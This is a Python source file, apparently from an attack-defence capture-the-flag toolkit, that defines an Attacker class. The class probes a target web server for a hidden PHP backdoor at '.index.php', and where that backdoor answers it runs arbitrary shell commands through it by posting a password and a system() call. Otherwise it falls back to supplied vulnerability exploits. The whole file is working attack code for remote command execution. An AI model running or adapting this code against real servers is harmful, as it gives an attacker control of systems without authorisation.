import requests
from utils.tools import get_backdoor_password
class Attacker():
    def __init__(self, target_ip, target_port, cmd, vulns):
        self.target_ip = target_ip
        self.target_port = target_port
        self.cmd = cmd
        self.vulns = vulns

    def run(self):
        res = ''
        # TO-DO 检测是否存在后门,存在则使用后面,不存在就使用漏洞攻击
        if self.get_backdoor_status():
            res = self.attack_by_backdoor()
        else:
            res = self.attack_by_vulns()

        return res
    def exec_cmd_with_backdoor(self,cmd):
        data = {
            'pass': get_backdoor_password(self.target_ip, self.target_port),
            'W4ndell': f"system('{cmd}');"
        }
        proxies = {
            # "http": "http://127.0.0.1:8080"
        }
        res = requests.post(f'http://{self.target_ip}:{self.target_port}/' + '.index.php', data=data, timeout=2,proxies=proxies).text
        return res
    def get_backdoor_status(self):
        try:
            res = requests.get(f'http://{self.target_ip}:{self.target_port}/' + '.index.php', timeout=2).text
            if res == 'w4ndell':
                return 1
        except requests.exceptions.Timeout as e:
            pass
        return 0

    def attack_by_backdoor(self):
        if type(self.cmd) ==str:
            return self.exec_cmd_with_backdoor(self.cmd)
        else:
            return self.cmd[1](self.exec_cmd_with_backdoor(self.cmd[0]))

    def attack_by_vulns(self):
        for vuln in self.vulns:
            return self.attack_by_vuln(vuln)

    def attack_by_vuln(self, vuln):
        if type(self.cmd) ==str:
            return vuln(self.target_ip, self.target_port, self.cmd)
        else:
            return self.cmd[1](vuln(self.target_ip, self.target_port, self.cmd[0]))


if __name__ == '__main__':
    attacker = Attacker('', '', '', '')
